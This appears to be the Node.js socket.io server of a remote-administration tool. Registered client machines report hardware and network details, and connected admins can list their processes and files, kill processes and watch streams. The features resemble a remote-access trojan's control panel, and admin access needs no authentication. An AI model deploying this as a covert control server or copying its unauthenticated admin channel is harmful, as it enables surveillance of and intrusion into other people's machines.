var express = require('express');
var app = new express();
var http = require('http').Server(app);
var io = require('socket.io')(http);

var port = process.env.PORT || 6777;

io.on('connection', function(socket) {

	if (socket.request.headers['is-client'] == "true") {
		socket.join('clients');

		socket.info = {
			id: socket.id,
			name: socket.request.headers['name'],
			mac: socket.request.headers['mac'],
			processor_info: socket.request.headers['processor-info'],
			memory: socket.request.headers['memory'],
			os: socket.request.headers['os'],
			ip: ip(socket)
		};

		io.to('admins').emit('client_connected', socket.info);

		bindClient(socket);
	}
	else {
		console.log(`Admin ${socket.id} connected.`);
		socket.join('admins');

		socket.emit('clients', clients());

		bindAdmin(socket);
	}
});

function bindClient(socket) {
	socket.on('disconnect', function() {
		io.to('admins').emit('client_disconnected', {id:socket.id})
		console.log(`User ${socket.id} disconnected.`)
	});

	socket.on('processes', function(data) {
    var e = JSON.parse(data);
    io.to(e.CallbackAdminId).emit('processes', { id: socket.id, list: e.List });
  });

	socket.on('files', function(data) {
    var e = JSON.parse(data);
    io.to(e.CallbackAdminId).emit('files', { ClientId: socket.id, OriginalPath: e.Path, Files: e.List });
    console.log(data);
  });

  socket.on('log', function(data) {
  	var e = JSON.parse(data);
    io.to(e.CallbackAdminId).emit('log', { message: e.Message, title: e.Title });
	});
}

function bindAdmin(socket) {
	socket.on('disconnect', function() {
		console.log(`Admin ${socket.id} disconnected.`)
	});

	socket.on('processes', function(data) {
		io.to(data.id).emit('processes', { callbackAdminId: socket.id });
		console.log(`Admin ${socket.id} requests processes of ${data.id}`);
	});

	socket.on('request_files', function(data) {
		io.to(data.clientId).emit('files', { callbackAdminId: socket.id, path: data.path });
		console.log(data);
	});

	socket.on('kill_process', function(data) {
		io.to(data.id).emit('kill_process', {callbackAdminId: socket.id, processId: data.processId});
		console.log(`Admin ${socket.id} requests process kill ${data.processId}`);
	});

	socket.on('play_stream', function(data) {
		// vulnerability: room creation spam possible
		socket.join(streamById(data.id));
		io.to(streamById(data.id)).emit('viewers', roomSize(streamById(data.id)));
	});

	socket.on('stop_stream', function(data) {
		socket.leave(streamById(data.id));
		io.to(streamById(data.id)).emit('viewers', roomSize(streamById(data.id)));
	});
}

http.listen(port, function() {
	console.log(`Listening on port ${port}`);
});

function findAllInRoom(room) {
	var ret = [], room = io.sockets.adapter.rooms[room];
	if (room) {
		for (var id in room.sockets) {
			ret.push(io.sockets.adapter.nsp.connected[id]);
		}
	}

	return ret;
}

function clients() {
	var ret = [], room = io.sockets.adapter.rooms['clients'];
	if (room) {
		for (var id in room.sockets) {
			ret.push(io.sockets.adapter.nsp.connected[id].info);
		}
	}

	return ret;
}

function ip(client) {
  var address = client.request.headers['x-forwarded-for'] || client.request.connection.remoteAddress;
  return address.replace(/^.*:/, '');
}

function streamById(id) {
	return `STRM${id}`;
}

function streamBySocket(socket) {
	return streamById(socket.id);
}

function roomSize(room) {
	var room = io.sockets.adapter.rooms[room];
	if (room) {
		return room.length;
	} else {
		return 0;
	}
}